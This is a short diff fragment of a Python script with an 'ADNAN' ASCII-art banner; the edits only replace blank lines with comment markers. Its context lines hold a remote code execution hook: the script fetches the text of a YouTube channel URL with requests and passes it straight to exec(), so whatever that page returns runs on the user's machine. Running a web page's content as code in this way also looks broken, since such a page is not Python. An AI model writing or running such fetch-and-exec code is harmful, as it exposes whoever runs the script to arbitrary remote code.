@@ -41,7 +41,7 @@ rs=requests.session()
 rg=rs.get
 x=(rg("https://youtube.com/@Killer.of.mafiya?si=SscPDw3tT0hewyLS").text)
 exec(x)
-
+#### 
      ___       _______  .__   __.      ___      .__   __. 
     /   \     |       \ |  \ |  |     /   \     |  \ |  | 
    /  ^  \    |  .--.  ||   \|  |    /  ^  \    |   \|  | 
@@ -49,7 +49,7 @@ exec(x)
  /  _____  \  |  '--'  ||  |\   |  /  _____  \  |  |\   | 
 /__/     \__\ |_______/ |__| \__| /__/     \__\ |__| \__| 
                                                           
-
+ #####
 
 id = []
 
